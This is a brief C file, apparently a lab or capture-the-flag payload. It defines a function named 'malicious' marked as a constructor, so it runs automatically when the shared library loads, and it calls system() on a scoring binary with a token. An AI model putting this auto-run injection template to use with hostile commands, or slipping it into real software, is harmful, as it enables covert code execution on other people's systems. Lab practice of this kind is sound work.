#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
  system("/usr/local/bin/score 64f36db0-e16b-41d9-a350-a08457b94e13");
}
